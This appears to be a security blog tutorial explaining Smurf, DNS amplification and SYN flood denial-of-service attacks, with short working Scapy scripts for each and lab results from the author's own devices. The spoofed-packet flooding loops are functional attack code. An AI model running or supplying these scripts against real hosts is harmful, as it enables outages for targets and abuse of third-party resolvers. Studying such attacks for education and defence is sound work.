---
title: "An Introduction to a Few Network Attacks"
date: 2019-10-15
toc: true
toc_label: "Table of Contents"
categories:
  - blog
tags:
  - Network Security
  - DNS Amplification
  - ICMP Spoofing
  - SYN Floods
  - Scapy
---

# Introduction
In a previous [post][dns], we had a look at spoofing DNS responses, which allowed us to redirect users to a web server running on our machine. In this post, we will look at a few network attacks that can lead to a DoS.

The below section is a basic refresher on ICMP and can be skipped. 

# ICMP
Internet Control Message Protocol (ICMP) is a protocol used primarily to report errors (source quench, unreachable destination, etc.) in sending IP packets. An ICMP packet has the following packet format.

![ICMP-Message-Format](../../assets/images/icmp_format.png)

The two codes relevant to the Smurf attack are:

1. 8 - for echo request message, and
2. 0 - for echo reply message

The above messages are commonly known as the ping messages and are used to test connectivity issues and obtain statistics about the connections of a network. When a host receives an ICMP echo request, it sends back an ICMP echo reply packet to the sender. The sender uses the replies to compute metrics such as the round trip time.  

# Smurf Attack
Since the IP address fields of an ICMP packet can be spoofed, the attacker can send an ICMP request message to the network's broadcast address claiming to be the target, which results in the target receiving the ICMP responses from all the live hosts on the network. If the number of responses is much higher than what the target can handle, it can result in a DoS. This is the idea behind the Smurf attack. 

This is an amplification of the traffic, i.e., for one packet sent by the attacker, the target receives *n* packets, where *n* is the number of hosts that respond. This dramatically improves the attacker's strength in taking the target down.

The following code can be utilized for a smurf attack.

```python
pkt = IP(src = target_ip, dst = broadcast_ip)/ICMP()
while True:
  send(pkt)
```

That's it. The above 3 lines of code are all it takes to simulate a Smurf attack. But most hosts these days are configured not to respond to an ICMP request on the broadcast address. To get over this hurdle, one mechanism is to send each host an invalid packet. On receiving the invalid packet, a host might send back an ICMP response to the target with the details of the error (larger than what attacker sends).

# DNS Amplification
Another way to attack a target is by spoofing DNS queries. Since the size of a DNS query is smaller than the response, the amount of work done by the attacker to send the DNS queries will be significantly lesser than what the target needs to do to process the replies. The following code shows how this can be done.

```python
while True:
  for name_server in g_name_servers:
    ip = IP(src = g_target_ip, dst = name_server)
    udp = UDP(sport=RandShort(), dport=53)
    dns = DNS(rd = 1,
            qd = DNSQR(
              qname = g_domain,
              qtype = "ANY"		# Play around to see which one returns max answer length
            )
          )

    # Create the spoofed DNS query and send it
    pkt = ip/udp/dns
    send(pkt, verbose = False)
```

The above code takes a list of DNS resolvers and queries each one with a spoofed IP address (set to the target). Each DNS resolver then sends the response to the target instead of the attacker. Since the size of the DNS response is much larger than the size of the query, the attacker has the upper hand while trying to overwhelm the target. If the responses are too many, the target will not be able to function, resulting in a DoS.

## DNS Amplification Results
The following image shows the IP address of the attacker (a Raspberry 3B+)

![pi_ifconfig](../../assets/images/syn-flood/pi_ifconfig.png)

and below we can see the target's (my laptop) IP address
![laptop_ipconfig](../../assets/images/syn-flood/laptop_ipconfig.png)

We run the script in the following manner.
![attack](../../assets/images/syn-flood/attack.png)

Looking at the intercepted messages on my laptop, we can see that DNS replies are being received for
queries never sent. We can see that the length of the DNS response is 124 bytes, which is much larger than the query the attacker has sent. 
![wireshark-output](../../assets/images/syn-flood/wireshark-output.png)

# SYN Flood
Moving on to the TCP layer, one attack that can result in a DoS is the SYN flood attack, where an attacker sends a large number of SYNs to various ports of the target and not respond to them. This results in a large number of half-open connections, and before the connections can time out, another SYN is sent to reset the timer. This will eventually lead to a DoS. The following code shows the implementation in python.

```python
# Create the IP layer
ip = IP(src = source_ip, dst = g_target_ip)   # Note that the source_ip can be spoofed

# Create the SYN packet
tcp = TCP(sport=RandShort(), dport=g_dest_ports, flags="S", seq=42)

# Create the packet and continuously send it to all the specified ports
pkt = ip/tcp
while True:
  send(pkt)
```
# SYN Flood Result
The script is run in the following manner.

![syn-flood-pi](../../assets/images/syn-flood/syn-flood-pi.png)

The SYN packets can be seen below.

![syn-flood-wireshark](../../assets/images/syn-flood/syn-flood-wireshark.png)

To specify more ports to send packets to, use the `-c` flag.


The full scripts are available on my github [page][page].

# Disclaimer
The attacks mentioned on any posts on my website are to be tested at your own risk. Please do not use them without the permission of the target host. I will not be responsible for any damage caused by running them.  

[dns]: https://fsec404.github.io/blog/DNS-hijacking/#results
[page]: https://github.com/venkat-abhi/network-attacks